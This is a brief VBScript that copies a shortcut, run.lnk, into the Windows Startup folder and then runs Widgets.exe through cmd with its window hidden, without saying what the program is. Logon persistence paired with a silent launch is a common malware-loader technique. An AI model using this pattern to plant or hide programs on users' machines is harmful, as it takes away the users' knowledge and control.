' Copy link

Dim fso, shell, startupPath, sourceFile, targetFile

Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

startupPath = shell.SpecialFolders("Startup")
sourceFile = "run.lnk"
targetFile = startupPath & "\" & fso.GetFileName(sourceFile)

If Not fso.FileExists(targetFile) And fso.FileExists(sourceFile) Then
    fso.CopyFile sourceFile, targetFile, True
End If


' Run

Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "cmd /c Widgets.exe", 0, False
